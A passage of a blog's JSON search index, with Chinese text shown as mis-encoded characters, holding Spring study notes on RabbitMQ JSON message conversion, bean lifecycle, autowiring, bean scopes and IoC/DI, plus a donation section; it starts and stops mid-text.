msg);\n}\n```\n\nå‘é€æ¶ˆæ¯åæŸ¥çœ‹æ§åˆ¶å°ï¼Œå¯ä»¥çœ‹åˆ°æ¶ˆæ¯å¾ˆé•¿ï¼Œå¯è¯»æ€§å·®ã€‚\n\n![](https://img.jwt1399.top/img/202210082150423.png)\n\n#### âé…ç½®JSONè½¬æ¢å™¨\n\næ˜¾ç„¶ï¼ŒJDKåºåˆ—åŒ–æ–¹å¼å¹¶ä¸åˆé€‚ã€‚æˆ‘ä»¬å¸Œæœ›æ¶ˆæ¯ä½“çš„ä½“ç§¯æ›´å°ã€å¯è¯»æ€§æ›´é«˜ï¼Œå› æ­¤å¯ä»¥ä½¿ç”¨JSONæ–¹å¼æ¥åšåºåˆ—åŒ–å’Œååºåˆ—åŒ–ã€‚\n\nåœ¨publisherå’Œconsumerä¸¤ä¸ªæœåŠ¡ä¸­éƒ½å¼•å…¥jacksonä¾èµ–ï¼š\n\n```xml\n<dependency>\n    <groupId>com.fasterxml.jackson.dataformat</groupId>\n    <artifactId>jackson-dataformat-xml</artifactId>\n    <version>2.9.10</version>\n</dependency>\n```\n\né…ç½®æ¶ˆæ¯è½¬æ¢å™¨ï¼Œåœ¨å¯åŠ¨ç±»ä¸­æ·»åŠ ä¸€ä¸ªBeanå³å¯ï¼š\n\n```java\n@Bean\npublic MessageConverter jsonMessageConverter(){\n    return new Jackson2JsonMessageConverter();\n}\n```\n\n# 10.elasticsearch\n\n\n\n\n\n\n\n# Sponsorâ¤ï¸\n\næ‚¨çš„æ”¯æŒæ˜¯æˆ‘ä¸æ–­å‰è¿›çš„åŠ¨åŠ›ï¼Œå¦‚æœæ‚¨æ„Ÿè§‰æœ¬æ–‡å¯¹æ‚¨æœ‰æ‰€å¸®åŠ©çš„è¯ï¼Œå¯ä»¥è€ƒè™‘æ‰“èµä¸€ä¸‹æœ¬æ–‡ï¼Œç”¨ä»¥ç»´æŒæœ¬åšå®¢çš„è¿è¥è´¹ç”¨ï¼Œæ‹’ç»ç™½å«–ï¼Œä»ä½ æˆ‘åšèµ·ï¼ğŸ¥°ğŸ¥°ğŸ¥°\n\n<table>\n  <tbody>\n     <tr>\n         <td style=\"text-align:center;\">æ”¯ä»˜å®</td>\n         <td style=\"text-align:center;\">å¾®ä¿¡</td>\n     </tr>\n   <tr>\n    <td style=\"text-align:center;\" ><img width=\"200\" src=\"https://jwt1399.top/medias/reward/alipay.png\"></td>    \n      <td style=\"text-align:center;\"><img width=\"200\" src=\"https://jwt1399.top/medias/reward/sponor_wechat.png\"></td>     \n  </tr>\n</tbody></table>\n","tags":["SpringCloud"],"categories":["Spring"]},{"title":"Spring-å…¨å®¶æ¡¶","url":"/posts/32823.html","content":"\n# 1.Spring\n\n## â‘ Bean\n\n### ä»€ä¹ˆæ˜¯ Spring Beanï¼Ÿ\n\nBean æŒ‡çš„å°±æ˜¯é‚£äº›è¢« IoC å®¹å™¨æ‰€ç®¡ç†çš„å¯¹è±¡ã€‚æˆ‘ä»¬éœ€è¦å‘Šè¯‰ IoC å®¹å™¨å¸®åŠ©æˆ‘ä»¬ç®¡ç†å“ªäº›å¯¹è±¡ï¼Œé€šè¿‡é…ç½®æ¥å®ç°ã€‚é…ç½®æ–¹å¼å¯ä»¥æ˜¯ XML æ–‡ä»¶ã€æ³¨è§£æˆ–è€… Java é…ç½®ç±»ã€‚\n\n```xml\n<bean id=\"book\" class=\"com.jwt.ioc.Book\">\n  <property name=\"bname\" value=\"Javaå…¥é—¨åˆ°ç²¾é€š\"></property>\n  <property name=\"bauthor\" value=\"å°ç®€\"></property>\n</bean>\n```\n\n### â¶ç®€è¿° bean çš„ç”Ÿå‘½å‘¨æœŸ\n\n**Beanç”Ÿå‘½å‘¨æœŸï¼šä»å¯¹è±¡åˆ›å»ºåˆ°å¯¹è±¡é”€æ¯çš„è¿‡ç¨‹**\n\n- 1ã€é€šè¿‡æ„é€ å™¨åˆ›å»º bean å®ä¾‹ï¼ˆæ— å‚æ•°æ„é€ ï¼‰\n- 2ã€ä¸º bean çš„å±æ€§è®¾ç½®å€¼å’Œå¯¹å…¶ä»– bean å¼•ç”¨ï¼ˆè°ƒç”¨setæ–¹æ³•ï¼‰\n- 3ã€è°ƒç”¨ bean çš„åˆå§‹åŒ–çš„æ–¹æ³•ï¼ˆéœ€è¦è¿›è¡Œé…ç½®åˆå§‹åŒ–çš„æ–¹æ³•ï¼‰\n- 4ã€bean å¯ä»¥ä½¿ç”¨äº†ï¼ˆå¯¹è±¡è·å–åˆ°äº†ï¼‰\n- 5ã€å½“å®¹å™¨å…³é—­æ—¶å€™ï¼Œè°ƒç”¨ bean çš„é”€æ¯çš„æ–¹æ³•ï¼ˆéœ€è¦è¿›è¡Œé…ç½®é”€æ¯çš„æ–¹æ³•ï¼‰\n\n**å¦‚æœæœ‰beanåç½®å¤„ç†å™¨ï¼Œåˆ™beançš„ç”Ÿå‘½å‘¨æœŸæœ‰ä¸ƒç§**\n\n- 1ã€é€šè¿‡æ„é€ å™¨åˆ›å»º bean å®ä¾‹ï¼ˆæ— å‚æ•°æ„é€ ï¼‰\n- 2ã€ä¸º bean çš„å±æ€§è®¾ç½®å€¼å’Œå¯¹å…¶ä»– bean å¼•ç”¨ï¼ˆè°ƒç”¨ set æ–¹æ³•ï¼‰\n- **3**ã€æŠŠ bean å®ä¾‹ä¼ é€’ bean åç½®å¤„ç†å™¨çš„æ–¹æ³• postProcessBeforeInitialization\n- 4ã€è°ƒç”¨ bean çš„åˆå§‹åŒ–çš„æ–¹æ³•ï¼ˆéœ€è¦è¿›è¡Œé…ç½®åˆå§‹åŒ–çš„æ–¹æ³•ï¼‰\n- **5**ã€æŠŠ bean å®ä¾‹ä¼ é€’ bean åç½®å¤„ç†å™¨çš„æ–¹æ³• postProcessAfterInitialization\n- 6ã€bean å¯ä»¥ä½¿ç”¨äº†ï¼ˆå¯¹è±¡è·å–åˆ°äº†ï¼‰\n- 7ã€å½“å®¹å™¨å…³é—­æ—¶å€™ï¼Œè°ƒç”¨ bean çš„é”€æ¯çš„æ–¹æ³•ï¼ˆéœ€è¦è¿›è¡Œé…ç½®é”€æ¯çš„æ–¹æ³•ï¼‰\n\n1. å®ä¾‹åŒ–ï¼ˆé€šè¿‡åå°„åˆ›å»ºå¯¹è±¡ï¼‰\n2. å±æ€§å¡«å……ï¼ˆå±æ€§å€¼éè‡ªåŠ¨è£…é…ï¼‰\n3. åˆå§‹åŒ–ï¼ˆå¦‚æ•°æ®æºèµ‹å€¼ã€æ ¡éªŒå±æ€§ï¼‰\n4. é”€æ¯ï¼ˆiocå®¹å™¨é”€æ¯å…³é—­ï¼Œå…³é—­æ•°æ®æºï¼‰\n\n### â·ä»€ä¹ˆæ˜¯ Spring å®¹å™¨\n\nspringå®¹å™¨æ˜¯springçš„æ ¸å¿ƒï¼Œä¸€åˆ‡çš„spring beanéƒ½å­˜å‚¨åœ¨springå®¹å™¨å†…ï¼Œå¹¶é€šè¿‡iocè¿›è¡Œç®¡ç†\n\nspringå®¹å™¨å°±æ˜¯ä¸€ä¸ªbeanå·¥å‚ï¼ˆBeanFactoryï¼‰ï¼Œåº”ç”¨ä¸­beançš„å®ä¾‹åŒ–ã€è·å–ã€é”€æ¯éƒ½æ˜¯ç”±è¿™ä¸ªbeanå·¥å‚ç®¡ç†çš„ã€‚ \n\nApplicationContextæ¥å£ç”¨äºå®Œæˆå®¹å™¨çš„é…ç½®ï¼Œåˆå§‹åŒ–ï¼Œç®¡ç†beanã€‚ä¸€ä¸ªSpringå®¹å™¨å°±æ˜¯æŸä¸ªå®ç°ApplicationContext\n\næ¥å£çš„ç±»çš„å®ä¾‹ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œä»ä»£ç å±‚é¢ï¼ŒSpringå®¹å™¨å…¶å®å°±æ˜¯ä¸€ä¸ªApplicationContextã€‚Springå®¹å™¨çš„ä½œç”¨æˆ‘è§‰å¾—\n\næ˜¯å®ç°äº†æ§åˆ¶åè½¬è¿™ç§æ€æƒ³\n\n### â¸Springè‡ªåŠ¨è£…é…æ–¹å¼æœ‰å“ªäº›ï¼Ÿ\n\nbeanè£…é…ï¼šæŒ‡åœ¨Springå®¹å™¨ä¸­æŠŠbeanç»„è£…åˆ°ä¸€èµ·ï¼Œå‰ææ˜¯å®¹å™¨éœ€è¦çŸ¥é“beançš„ä¾èµ–å…³ç³»\n\nä»€ä¹ˆæ˜¯è‡ªåŠ¨è£…é…ï¼šæ ¹æ®æŒ‡å®šè£…é…è§„åˆ™(å±æ€§åç§°æˆ–è€…å±æ€§ç±»å‹)ï¼ŒSpringå®¹å™¨èƒ½å¤Ÿè‡ªåŠ¨æ³¨å…¥ç›¸äº’åˆä½œçš„beanï¼Œè¿™æ„å‘³ç€å®¹å™¨ä¸éœ€è¦é…ç½®ï¼Œèƒ½é€šè¿‡Beanå·¥å‚è‡ªåŠ¨å¤„ç†beanä¹‹é—´çš„åä½œã€‚\n\nSpringçš„è‡ªåŠ¨è£…é…æœ‰äº”ç§æ¨¡å¼ï¼š\n\n- noï¼šä¸è¿›è¡Œè‡ªåŠ¨è£…é…ï¼Œé€šè¿‡æ‰‹å·¥è®¾ç½®refå±æ€§æ¥è¿›è¡Œè£…é…beanã€‚\n- byNameï¼šæ ¹æ®Beançš„åå­—è¿›è¡Œè‡ªåŠ¨è£…é…ã€‚\n\n- byTypeï¼šæ ¹æ®Beançš„ç±»å‹è¿›è¡Œè‡ªåŠ¨è£…é…ã€‚\n- constructorï¼šç±»ä¼¼äºbyTypeï¼Œä¸è¿‡æ˜¯åº”ç”¨äºæ„é€ å™¨çš„å‚æ•°ï¼Œå¦‚æœæ­£å¥½æœ‰ä¸€ä¸ªBeanä¸æ„é€ å™¨çš„å‚æ•°ç±»å‹ç›¸åŒåˆ™å¯ä»¥è‡ªåŠ¨è£…é…ï¼Œå¦åˆ™ä¼šå¯¼è‡´é”™è¯¯ã€‚\n- autodetectï¼šå¦‚æœæœ‰é»˜è®¤çš„æ„é€ å™¨ï¼Œåˆ™é€šè¿‡constructorçš„æ–¹å¼è¿›è¡Œè‡ªåŠ¨è£…é…ï¼Œå¦åˆ™ä½¿ç”¨byTypeçš„æ–¹å¼è¿›è¡Œè‡ªåŠ¨è£…é…ã€‚\n\n### @Autowired å’Œ @Resource çš„åŒºåˆ«æ˜¯ä»€ä¹ˆï¼Ÿ\n\n- `@Autowired` æ˜¯ Spring æä¾›çš„æ³¨è§£ï¼Œ`@Resource` æ˜¯ JDK æä¾›çš„æ³¨è§£ã€‚\n- `Autowired` é»˜è®¤çš„æ³¨å…¥æ–¹å¼ä¸º`byType`ï¼ˆæ ¹æ®ç±»å‹è¿›è¡ŒåŒ¹é…ï¼‰ï¼Œ`@Resource`é»˜è®¤æ³¨å…¥æ–¹å¼ä¸º `byName`ï¼ˆæ ¹æ®åç§°è¿›è¡ŒåŒ¹é…ï¼‰ã€‚\n- å½“ä¸€ä¸ªæ¥å£å­˜åœ¨å¤šä¸ªå®ç°ç±»çš„æƒ…å†µä¸‹ï¼Œ`@Autowired` å’Œ`@Resource`éƒ½éœ€è¦é€šè¿‡åç§°æ‰èƒ½æ­£ç¡®åŒ¹é…åˆ°å¯¹åº”çš„ Beanã€‚`Autowired` å¯ä»¥é€šè¿‡ `@Qualifier` æ³¨è§£æ¥æ˜¾å¼æŒ‡å®šåç§°ï¼Œ`@Resource`å¯ä»¥é€šè¿‡ `name` å±æ€§æ¥æ˜¾å¼æŒ‡å®šåç§°ã€‚\n\n\n\nä¸¾ä¸ªä¾‹å­ï¼Œ`SmsService` æ¥å£æœ‰ä¸¤ä¸ªå®ç°ç±»: `SmsServiceImpl1`å’Œ `SmsServiceImpl2`ï¼Œä¸”å®ƒä»¬éƒ½å·²ç»è¢« Spring å®¹å™¨æ‰€ç®¡ç†ã€‚\n\n```java\n// æŠ¥é”™ï¼Œæ— æ³•åŒ¹é…åˆ° bean\n@Autowired\nprivate SmsService smsService;\n\n\n// æ­£ç¡®æ³¨å…¥ SmsServiceImpl1 å¯¹è±¡å¯¹åº”çš„ bean\n@Autowired\n@Qualifier(value = \"smsServiceImpl1\")\nprivate SmsService smsService;\n\n---------------------------------------------------------------------------\n\n// æŠ¥é”™ï¼Œæ— æ³•åŒ¹é…åˆ° bean\n@Resource\nprivate SmsService smsService;\n\n\n// æ­£ç¡®æ³¨å…¥ SmsServiceImpl1 å¯¹è±¡å¯¹åº”çš„ beanï¼ˆæ¯”è¾ƒæ¨èè¿™ç§æ–¹å¼ï¼‰\n@Resource(name = \"smsServiceImpl1\")\nprivate SmsService smsService;\n```\n\n### @Beanå’Œ@Componentæœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ\n\n- @Component æ³¨è§£ç”¨åœ¨ç±»ä¸Šï¼Œè¡¨æ˜ä¸€ä¸ªç±»ä¼šä½œä¸ºç»„ä»¶ç±»ï¼Œå¹¶å‘ŠçŸ¥Springè¦ä¸ºè¿™ä¸ªç±»åˆ›å»ºbeanï¼Œæ¯ä¸ªç±»å¯¹åº”ä¸€ä¸ª Beanã€‚è‡ªåŠ¨è£…é…åˆ° Spring å®¹å™¨ä¸­\n\n- @Bean æ³¨è§£ç”¨åœ¨æ–¹æ³•ä¸Šï¼Œè¡¨ç¤ºè¿™ä¸ªæ–¹æ³•ä¼šè¿”å›ä¸€ä¸ª Beanã€‚@Bean éœ€è¦åœ¨é…ç½®ç±»ä¸­ä½¿ç”¨ï¼Œå³ç±»ä¸Šéœ€è¦åŠ ä¸Š@Configurationæ³¨è§£ã€‚\n\n@Bean æ³¨è§£æ›´åŠ çµæ´»ã€‚å½“éœ€è¦å°†ç¬¬ä¸‰æ–¹ç±»è£…é…åˆ° Spring å®¹å™¨ä¸­ï¼Œå› ä¸ºæ²¡åŠæ³•æºä»£ç ä¸Šæ·»åŠ @Componentæ³¨è§£ï¼Œåªèƒ½ä½¿ç”¨@Bean æ³¨è§£çš„æ–¹å¼ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥ä½¿ç”¨ xml çš„æ–¹å¼ã€‚\n\n`@Bean`æ³¨è§£ä½¿ç”¨ç¤ºä¾‹ï¼š\n\n```java\n@Component\npublic class UserServiceImpl {\n    private String name = \"Tom\";\n    public String getName() {\n        return name;\n    }\n}\n\n@Configuration\npublic class AppConfig {\n    @Bean\n    public UserService userService(){\n        return new UserServiceImpl();\n    }\n}\n```\n\nä¸Šé¢çš„ä»£ç ç›¸å½“äºä¸‹é¢çš„ xml é…ç½®\n\n```xml\n<beans>\n    <bean id=\"userService\" class=\"com.test.UserServiceImpl\"/>\n</beans>\n```\n\n\n\n### â¹BeanFactoryå’ŒFactoryBeançš„åŒºåˆ«ï¼Ÿ\n\n- **BeanFactory**ï¼šç®¡ç†Beançš„å®¹å™¨ï¼ŒSpringä¸­ç”Ÿæˆçš„Beanéƒ½æ˜¯ç”±è¿™ä¸ªæ¥å£çš„å®ç°æ¥ç®¡ç†çš„ã€‚\n\n- **FactoryBean**ï¼šé€šå¸¸æ˜¯ç”¨æ¥åˆ›å»ºæ¯”è¾ƒå¤æ‚çš„beanï¼Œä¸€èˆ¬çš„beanç›´æ¥ç”¨xmlé…ç½®å³å¯ï¼Œä½†å¦‚æœä¸€ä¸ªbeançš„\n  åˆ›å»ºè¿‡ç¨‹ä¸­æ¶‰åŠåˆ°å¾ˆå¤šå…¶ä»–çš„beanå’Œå¤æ‚çš„é€»è¾‘ï¼Œç›´æ¥ç”¨xmlé…ç½®æ¯”è¾ƒéº»çƒ¦ï¼Œè¿™æ—¶å¯ä»¥è€ƒè™‘ç”¨\n  FactoryBeanï¼Œå¯ä»¥éšè—å®ä¾‹åŒ–å¤æ‚Beançš„ç»†èŠ‚ã€‚\n\n### âºBeanFactoryå’ŒApplicationContextæœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ\n\nBeanFactory å’Œ ApplicationContext æ˜¯ Spring çš„ä¸¤å¤§æ ¸å¿ƒæ¥å£ï¼Œéƒ½å¯ä»¥å½“åš Spring çš„å®¹å™¨ï¼Œç®¡ç†Beanã€‚å…¶ä¸­\nApplicationContextæ˜¯ BeanFactoryçš„å­æ¥å£ã€‚\n\n1ã€åŠŸèƒ½ä¸Šçš„åŒºåˆ«\n\n- BeanFactoryæ˜¯Springé‡Œé¢æœ€åº•å±‚çš„æ¥å£ï¼ŒåŒ…å«äº†å„ç§Beançš„å®šä¹‰ï¼Œè¯»å–beané…ç½®æ–‡æ¡£ï¼Œç®¡ç†beançš„åŠ è½½ã€å®ä¾‹åŒ–ï¼Œæ§åˆ¶beançš„ç”Ÿå‘½å‘¨æœŸï¼Œç»´æŠ¤beanä¹‹é—´çš„ä¾èµ–å…³ç³»ã€‚\n\n- ApplicationContextæ¥å£ä½œä¸ºBeanFactoryçš„æ´¾ç”Ÿï¼Œé™¤äº†æä¾›BeanFactoryæ‰€å…·æœ‰çš„åŠŸèƒ½å¤–ï¼Œè¿˜æä¾›äº†æ›´å®Œæ•´çš„æ¡†æ¶åŠŸèƒ½ï¼Œå¦‚ç»§æ‰¿MessageSourceã€æ”¯æŒå›½é™…åŒ–ã€ç»Ÿä¸€çš„èµ„æºæ–‡ä»¶è®¿é—®æ–¹å¼ã€åŒæ—¶åŠ è½½å¤šä¸ªé…ç½®æ–‡ä»¶ç­‰åŠŸèƒ½ã€‚\n\n2ã€åŠ è½½æ–¹å¼çš„åŒºåˆ«\n\n- **BeanFactroyé‡‡ç”¨çš„æ˜¯å»¶è¿ŸåŠ è½½å½¢å¼æ¥æ³¨å…¥Beançš„ï¼Œå³åªæœ‰åœ¨ä½¿ç”¨åˆ°æŸä¸ªBeanæ—¶ï¼ˆè°ƒç”¨getBean())ï¼Œæ‰å¯¹è¯¥Beanè¿›è¡ŒåŠ è½½å®ä¾‹åŒ–ã€‚**è¿™æ ·ï¼Œæˆ‘ä»¬å°±ä¸èƒ½å‘ç°ä¸€äº›å­˜åœ¨çš„Springçš„é…ç½®é—®é¢˜ã€‚å¦‚æœBeançš„æŸä¸€ä¸ªå±æ€§æ²¡æœ‰æ³¨å…¥ï¼ŒBeanFacotryåŠ è½½åï¼Œç›´è‡³ç¬¬ä¸€æ¬¡ä½¿ç”¨è°ƒç”¨getBeanæ–¹æ³•æ‰ä¼šæŠ›å‡ºå¼‚å¸¸ã€‚ï¼ˆæ‡’æ±‰æ€æƒ³ç”ŸæˆBeanï¼‰\n- **ApplicationContextæ˜¯åœ¨å®¹å™¨å¯åŠ¨æ—¶ï¼Œä¸€æ¬¡æ€§åˆ›å»ºäº†æ‰€æœ‰çš„Beanã€‚**è¿™æ ·ï¼Œåœ¨å®¹å™¨å¯åŠ¨æ—¶ï¼Œæˆ‘ä»¬å°±å¯ä»¥å‘ç°Springä¸­å­˜åœ¨çš„é…ç½®é”™è¯¯ï¼Œè¿™æ ·æœ‰åˆ©äºæ£€æŸ¥æ‰€ä¾èµ–å±æ€§æ˜¯å¦æ³¨å…¥ã€‚ApplicationContextå¯åŠ¨åé¢„è½½å…¥æ‰€æœ‰çš„å•ä¾‹Beanï¼Œé‚£ä¹ˆåœ¨éœ€è¦çš„æ—¶å€™ï¼Œä¸éœ€è¦ç­‰å¾…åˆ›å»ºbeanï¼Œå› ä¸ºå®ƒä»¬å·±ç»åˆ›å»ºå¥½äº†ã€‚ï¼ˆé¥¿æ±‰æ€æƒ³ç”ŸæˆBeanï¼‰\n- ç›¸å¯¹äºåŸºæœ¬çš„BeanFactoryï¼ŒApplicationContext å”¯ä¸€çš„ä¸è¶³æ˜¯å ç”¨å†…å­˜ç©ºé—´ã€‚å½“åº”ç”¨ç¨‹åºé…ç½®Beanè¾ƒå¤š\n  æ—¶ï¼Œç¨‹åºå¯åŠ¨è¾ƒæ…¢ã€‚\n\n3ã€åˆ›å»ºæ–¹å¼çš„åŒºåˆ«\n\n- BeanFactoryé€šå¸¸ä»¥ç¼–ç¨‹çš„æ–¹å¼è¢«åˆ›å»º\n- ApplicationContextè¿˜èƒ½ä»¥å£°æ˜çš„æ–¹å¼åˆ›å»ºï¼Œå¦‚ä½¿ç”¨ContextLoaderã€‚\n\n4ã€æ³¨å†Œæ–¹å¼çš„åŒºåˆ«\n\n- BeanFactory å’Œ ApplicationContext éƒ½æ”¯æŒ BeanPostProcessorã€BeanFactoryPostProcessor çš„ä½¿ç”¨ï¼Œä½†ä¸¤è€…ä¹‹é—´çš„åŒºåˆ«æ˜¯ï¼šBeanFactoryéœ€è¦æ‰‹åŠ¨æ³¨å†Œï¼ŒApplicationContextåˆ™æ˜¯è‡ªåŠ¨æ³¨å†Œã€‚\n\n\n\n### â»Springä¸­beançš„ä½œç”¨åŸŸ\n\n| ä½œç”¨åŸŸ                     | ä½œç”¨èŒƒå›´        | æè¿°                                                         |\n| :------------------------- | --------------- | :----------------------------------------------------------- |\n| singleton                  | æ‰€ç”¨springåº”ç”¨  | å•ä¾‹ï¼ŒSpringä¸­çš„beané»˜è®¤éƒ½æ˜¯å•ä¾‹çš„ã€‚                         |\n| prototype                  | æ‰€ç”¨springåº”ç”¨  | æ¯æ¬¡è¯·æ±‚éƒ½ä¼šåˆ›å»ºä¸€ä¸ªæ–°çš„beanå®ä¾‹ã€‚å³æ¯æ¬¡è°ƒç”¨getBean()æ—¶ï¼Œç›¸å½“äºæ‰§è¡ŒnewXxxBean()ã€‚ |\n| request                    | spring web åº”ç”¨ | æ¯ä¸€æ¬¡HTTPè¯·æ±‚éƒ½ä¼šäº§ç”Ÿä¸€ä¸ªæ–°çš„beanï¼Œè¯¥beanä»…åœ¨å½“å‰HTTP requestå†…æœ‰æ•ˆã€‚ |\n| session                    | spring web åº”ç”¨ | æ¯ä¸€æ¬¡æ¥è‡ªæ–° session çš„ HTTP è¯·æ±‚éƒ½ä¼šäº§ç”Ÿä¸€ä¸ªæ–°çš„ beanï¼Œè¯¥beanä»…åœ¨å½“å‰HTTP sessionå†…æœ‰æ•ˆã€‚ |\n| application/global-session | spring web åº”ç”¨ | å…¨å±€sessionä½œç”¨åŸŸï¼Œæ¯ä¸ª Web åº”ç”¨åœ¨å¯åŠ¨æ—¶åˆ›å»ºä¸€ä¸ª Beanï¼Œè¯¥ bean ä»…åœ¨å½“å‰åº”ç”¨å¯åŠ¨æ—¶é—´å†…æœ‰æ•ˆã€‚ |\n| websocket                  | spring web åº”ç”¨ | æ¯ä¸€æ¬¡ WebSocket ä¼šè¯äº§ç”Ÿä¸€ä¸ªæ–°çš„ beanã€‚                     |\n\n**é…ç½® bean çš„ä½œç”¨åŸŸå‘¢ï¼Ÿ**\n\nxml æ–¹å¼ï¼š\n\n```xml\n<bean id=\"...\" class=\"...\" scope=\"singleton\"></bean>\n```\n\næ³¨è§£æ–¹å¼ï¼š\n\n```java\n@Bean\n@Scope(value = ConfigurableBeanFactory.SCOPE_PROTOTYPE)\npublic Person personPrototype() {\n    return new Person();\n}\n```\n\n\n\n### â¼Springæ¡†æ¶ä¸­çš„å•ä¾‹Beanæ˜¯çº¿ç¨‹å®‰å…¨çš„ä¹ˆï¼Ÿ\n\n**æ— çŠ¶æ€bean**ï¼šæ²¡æœ‰å®ä¾‹å˜é‡çš„beanï¼Œä¸èƒ½ä¿å­˜æ•°æ®ï¼Œæ˜¯çº¿ç¨‹å®‰å…¨çš„ã€‚\n\n**æœ‰çŠ¶æ€bean**ï¼šæœ‰å®ä¾‹å˜é‡çš„beanï¼Œå¯ä»¥ä¿å­˜æ•°æ®ï¼Œæ˜¯éçº¿ç¨‹å®‰å…¨çš„ã€‚\n\nåœ¨Springä¸­æ— çŠ¶æ€çš„Beané€‚åˆç”¨å•ä¾‹æ¨¡å¼ï¼Œè¿™æ ·å¯ä»¥å…±äº«å®ä¾‹æé«˜æ€§èƒ½ã€‚æœ‰çŠ¶æ€çš„Beanåœ¨å¤šçº¿ç¨‹ç¯å¢ƒä¸‹\n\nä¸å®‰å…¨ï¼Œä¸€èˆ¬ç”¨ `Prototype` æ¨¡å¼æˆ–è€…ä½¿ç”¨ `ThreadLocal` è§£å†³çº¿ç¨‹å®‰å…¨é—®é¢˜ã€‚\n\n\n\n## â‘¡IOC\n\n- ç®€è¿° Spring çš„ IOC æœºåˆ¶\n\n**IoCï¼ˆInverse of Control:æ§åˆ¶åè½¬ï¼‰** ï¼šå°±æ˜¯ç”±Springå®¹å™¨ç®¡ç†beançš„æ•´ä¸ªç”Ÿå‘½å‘¨æœŸï¼Œé€šè¿‡åå°„å®ç°å¯¹å…¶ä»–å¯¹è±¡çš„æ§åˆ¶ï¼ŒåŒ…æ‹¬åˆå§‹åŒ–ã€åˆ›å»ºã€é”€æ¯ç­‰ï¼Œè§£æ”¾æ‰‹åŠ¨åˆ›å»ºå¯¹è±¡çš„è¿‡ç¨‹ï¼ŒåŒæ—¶é™ä½ç±»ä¹‹é—´çš„è€¦åˆåº¦ã€‚\n\nIOCçš„å¥½å¤„å°±æ˜¯é™ä½äº†ç±»ä¹‹é—´çš„è€¦åˆï¼Œå¯¹è±¡åˆ›å»ºå’Œåˆå§‹åŒ–äº¤ç»™Springå®¹å™¨ç®¡ç†ï¼Œåœ¨éœ€è¦çš„æ—¶å€™åªéœ€å‘å®¹å™¨è¿›è¡Œç”³è¯·ã€‚èµ„æºä¸ç”±ä½¿ç”¨èµ„æºè€…ç®¡ç†ï¼Œè€Œç”±ä¸ä½¿ç”¨èµ„æºçš„ç¬¬ä¸‰æ–¹ç®¡ç†ï¼Œè¿™å¯ä»¥å¸¦æ¥å¾ˆå¤šå¥½å¤„ã€‚\n\nç¬¬ä¸€ï¼Œèµ„æºé›†ä¸­ç®¡ç†ï¼Œå®ç°èµ„æºçš„å¯é…ç½®å’Œæ˜“ç®¡ç†ã€‚\n\nç¬¬äºŒï¼Œé™ä½äº†ä½¿ç”¨èµ„æºåŒæ–¹çš„ä¾èµ–ç¨‹åº¦ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬è¯´çš„è€¦åˆåº¦ã€‚\n\n\n\nIoC çš„æ€æƒ³å°±æ˜¯å°†åŸæœ¬åœ¨ç¨‹åºä¸­æ‰‹åŠ¨åˆ›å»ºå¯¹è±¡çš„æ§åˆ¶æƒï¼Œäº¤ç”± Spring æ¡†æ¶æ¥ç®¡ç†ã€‚\n\n- **æ§åˆ¶** ï¼šæŒ‡çš„æ˜¯å¯¹è±¡åˆ›å»ºï¼ˆå®ä¾‹åŒ–ã€ç®¡ç†ï¼‰çš„æƒåŠ›\n- **åè½¬** ï¼šæ§åˆ¶æƒäº¤ç»™å¤–éƒ¨ç¯å¢ƒï¼ˆSpring æ¡†æ¶ã€IoC å®¹å™¨ï¼‰\n\n\n\n\n\n- ä»€ä¹ˆæ˜¯ DI ä¾èµ–æ³¨å…¥ï¼Ÿ\n\n**IOCçš„ä¸€ç§å®ç°æ–¹å¼å°±æ˜¯ä¾èµ–æ³¨å…¥ï¼ˆDIï¼‰**\n\nä¾èµ–æ³¨å…¥(Dependency Injection, DI)ï¼šåŠ¨æ€åœ°å‘å¯¹è±¡ä¸­æ³¨å…¥å®ƒæ‰€éœ€è¦çš„å…¶ä»–å¯¹è±¡ï¼ŒåŸç†æ˜¯é€šè¿‡åå°„\næ³¨å…¥çš„æ–¹å¼æœ‰ setteræ–¹æ³•ã€æ„é€ å™¨æ³¨å…¥ã€æ³¨è§£è‡ªåŠ¨æ³¨å…¥ï¼ˆ@Autowiredã€@Resourceã€@Valueï¼‰\n\n\n\n- IOCå®¹å™¨åˆå§‹åŒ–è¿‡ç¨‹\n\n1. ä»XMLä¸­è¯»å–é…ç½®æ–‡ä»¶ã€‚\n2. å°†beanæ ‡ç­¾è§£ææˆ BeanDefinitionï¼Œå¦‚è§£æ property å…ƒç´ ï¼Œ å¹¶æ³¨å…¥åˆ° BeanDefinition å®ä¾‹ä¸­ã€‚\n3. å°† BeanDefinition æ³¨å†Œåˆ°å®¹å™¨ BeanDefinitionMap ä¸­ã€‚\n4. BeanFactory æ ¹æ® BeanDefinition çš„å®šä¹‰ä¿¡æ¯åˆ›å»ºå®ä¾‹åŒ–å’Œåˆå§‹åŒ– beanã€‚\n\nSpringä¾èµ–æ³¨å…¥çš„æ–¹å¼æœ‰å“ªäº›\n\nï¼ˆ1ï¼‰æ„é€ å™¨æ³¨å…¥\n\nï¼ˆ2ï¼‰Setteræ–¹æ³•æ³¨å…¥\n\nï¼ˆ3ï¼‰æ³¨è§£æ³¨å…¥\n\nï¼ˆ4ï¼‰æ¥å£æ³¨å…¥\n\n## â‘¢AOP\n\nç®€è¿° Spring AOP çš„åŸç†\n\n## â‘£äº‹åŠ¡\n\nSpringäº‹åŠ¡çš„å®ç°æ–¹å¼å’ŒåŸç†ä»¥åŠéš”ç¦»çº§åˆ«ï¼Ÿ\n\nspringäº‹åŠ¡ä¼ æ’­æœºåˆ¶\n\nspringäº‹åŠ¡ä»€ä¹ˆæ—¶å€™ä¼šå¤±æ•ˆ?\n\n\n\n## â‘¤æ³¨è§£\n\nç®€è¿° Spring æ³¨è§£çš„å®ç°åŸç†\n\n- [JavaGuide](https://javaguide.cn/system-design/framework/spring/spring-common-annotations.html#_0-å‰è¨€)\n\n- [å°šç¡…è°·æ³¨è§£é©±åŠ¨å¼€å‘](https://www.bilibili.com/video/BV1gW411W7wy?p=1&vd_source=fa98a6d1417d05689c64bc1449966321)\n\n\n\n\n\n\n\nç®€è¿° Spring çš„åˆå§‹åŒ–æµç¨‹\n\nå¦‚ä½•è§£å†³ Spring çš„å¾ªç¯ä¾èµ–é—®é¢˜\n\n\nSpring æ˜¯æ€ä¹ˆè§£æ JSON æ•°æ®çš„ï¼Ÿ\n\nSpring 